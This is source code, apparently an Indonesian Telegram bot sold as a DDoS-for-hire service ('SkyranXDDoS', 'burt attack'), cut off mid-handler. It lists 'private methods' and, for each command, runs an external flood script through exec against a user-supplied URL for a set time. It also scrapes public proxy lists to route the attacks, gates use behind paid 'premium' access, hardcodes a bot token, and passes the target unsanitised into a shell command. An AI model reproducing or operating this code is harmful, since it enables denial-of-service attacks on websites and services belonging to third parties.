const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const CFonts = require('cfonts');
const { spawn } = require('child_process');
const figlet = require("figlet")
const token = '7224197609:AAGjC5b7Eo5qykGYRxZ9LiSkWZvcTNCOU9o';
const bot = new TelegramBot(token, {polling: true});
const adminData = JSON.parse(fs.readFileSync('admin.json', 'utf8'));
const adminIds = adminData.admins;
const timeLimit = parseInt(adminData.limit, 10);

console.log(figlet.textSync('SkyranXDDoS', {
    font: 'Standard',
    horizontalLayout: 'default',
    vertivalLayout: 'default',
    whitespaceBreak: false
  }))
  
    bot.on('message', (msg) => {
        const nama = msg.from?.first_name || msg.from?.username || 'Anonymous'; // Improved name handling
        const username = msg.from?.username || 'Anonymous'; 
        const userId = msg.from?.id || 'Unknown ID'; // Handle cases where ID might not be available
        const message = msg.text || msg.caption || 'Media atau pesan lain'; // Include caption for media messages

        console.log(`\x1b[97mâ”€â”€âŸ¨ \x1b[42m\x1b[97m[ @${nama} ]\x1b[50m[ @${username} ]\x1b[44m\x1b[35m[ ${userId} ]\x1b[0m`);
        console.log(`\x1b[31mPesan: \x1b[0m${message}\x1b[0m\n`);
    });

let processes = {};
const stopProcesses = (chatId) => {
  if (processes[chatId]) {
    processes[chatId].forEach(proc => proc.kill());
    processes[chatId] = [];
    bot.sendMessage(chatId, 'Proses berhasil dihentikan.');
  } else {
    bot.sendMessage(chatId, 'Tidak ada proses yang berjalan.');
  }
};
const urls = [
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=100',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=110',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=96',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=88',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=5',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=6',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=7',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=8',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=9',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=10',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=12', 
  'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
  'https://api.good-proxies.ru/getfree.php?count=1000&key=freeproxy',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
];

async function scrapeProxies(chatId) {
  let proxies = [];
  const totalUrls = urls.length;
  let progressMessage = await bot.sendMessage(chatId, 'Memulai Menganti proxy\n{ 0% }');

  for (let i = 0; i < totalUrls; i++) {
    try {
      const { data } = await axios.get(urls[i]);
      const $ = cheerio.load(data);

      $('tr').each((j, elem) => {
        const ip = $(elem).find('td').eq(0).text().trim();
        const port = $(elem).find('td').eq(1).text().trim();
        if (ip && port) {
          proxies.push(`${ip}:${port}`);
        }
      });
    } catch (error) {
      console.error(`Error scraping ${urls[i]}:`, error);
    }
    const progress = Math.round(((i + 1) / totalUrls) * 100);
    await bot.editMessageText(`Memulai Menganti Proxy\n{ ${progress}% }`, {
      chat_id: chatId,
      message_id: progressMessage.message_id
    });
  }
  fs.writeFileSync('proxy.txt', proxies.join('\n'), 'utf8');
  await bot.editMessageText('Proxy Berhasil Di Perbarui', {
    chat_id: chatId,
    message_id: progressMessage.message_id
  });

  console.log(`Scraped ${proxies.length} proxies and saved to proxy.txt`);
}

bot.onText(/\/start/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`Hallo ${name}
  
Nama Bot : burt attack
Developer : @Harry_Burt
Version : 1.0.0
  
DDOS PRIVATE METHODS
/bypass [ Url ] [ Time ]
/AttackL4 [ Url ] [ Time ]
/AttackL7 [ Url ] Time ]
/Tlsvip [ Url ] [ Time ]
/zamss [ Url ] [ Time ]
/Zamss-XcV [ Url ] [ Time ]
/MakLu [ Url ] [ Time ]
/BapakLu [ Url ] [ Time ]
/Kontol [ Url ] [ Time ]
/FLOOD [ Url ] [ Time ]
/Kill [ Url ] [ Time ]
/Hunter [ Url ] [ Time ]
/ExtraKill [ Url ] [ Time ]
/DarkKill [ Url ] [ Time ]
/ZamssKill [ Url ] [ Time ]
/Ghost [ Url ] [ Time ]
/SuperAttack [ Url ] [ Time ]
/TrackKill [ Url ] [ Time ]
  
Info Web 
/info [ Url ]

Proxy Scraper 
/upproxy 

Buy Script 
/script 

Cek Status Bot
/cekbot 

Cek IP Address
/cekip [ IP ] 

Tinyurl Web
/tinyurl [ Url ] 

Owner
/owner 

METHODS FOR OWNER 
/Ninja
/Mix
/Tls
/Https
/Samp
/Mc
/Strike
/SSH
/Wifi
/Strom
/Udp


  `);
});

bot.onText(/^\/AttackL7(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin mendapatkan premium maka chat owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node AttackL7.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: AttackL7\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Zamss-XcV(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Dimzxzzx');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Zamss-XcV.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Zamss-XcV\nStatus: owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/zamss(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Dimzxzzx');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node zamss.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: zamss\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Tlsvip(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Tlsvip.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Tlsvip\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/AttackL4(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Dimzxzzx');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node AttackL4.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: AttackL4\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bypass(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node bypass.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: bypass\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/loli(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node loli.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: loli\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Kontol(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Kontol.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Kontol\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/FLOOD(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node FLOOD.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: FLOOD.js\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Kill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node StarsXKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Kill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Hunter(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Hunter.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Hunter\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Ghost(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Ghost.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Ghost\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/ExtraKill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ExtraKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: ExtraKill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/DarkKill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node DarkKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: DarkKill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/ZamssKill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ZamssKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: ZamssKill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/SuperAttack(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node SuperAttack.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: SuperAttack\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/BapakLu(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node BapakLu.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: BapakLu\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/TrackKill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node TrackKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: TrackKill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Ninja(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Ninja.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Ninja\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Mix(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Mix.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Mixl\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Mc(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Mc.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Mc\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Tls(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
